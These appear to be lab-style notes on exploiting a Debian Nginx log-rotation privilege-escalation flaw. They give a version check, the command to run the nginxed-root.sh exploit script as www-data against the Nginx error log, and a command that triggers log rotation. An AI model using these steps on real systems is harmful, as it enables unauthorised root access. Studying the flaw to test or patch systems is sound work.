#### Detection
**Victim's Machine**
Finding the Nginx version:
```
dpkg -l | grep nginx
```

Note: Installed Nginx version is below 1.6.2-5+deb8u3.

#### Exploitation
**Attacker's Machine**
**Terminal 1**
For this exploit, it is required that the user be `www-data`. 
```
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
```

- `nginxed-root.sh`: This is the exploit script.
- `/var/log/nginx/error.log`: Path to Nginx's error log file, which is being used as part of the exploit.

At this stage, the system waits for `logrotate` to execute. Nginx typically uses `logrotate` to rotate logs (renaming old logs and starting new ones).

**Terminal 2**
Manually trigger Log Rotation.
```
invoke-rc.d nginx >/dev/null 2>&1
```

- `>/dev/null 2>&1`: This redirects both ***standard output*** and ***standard error*** to `/dev/null`.
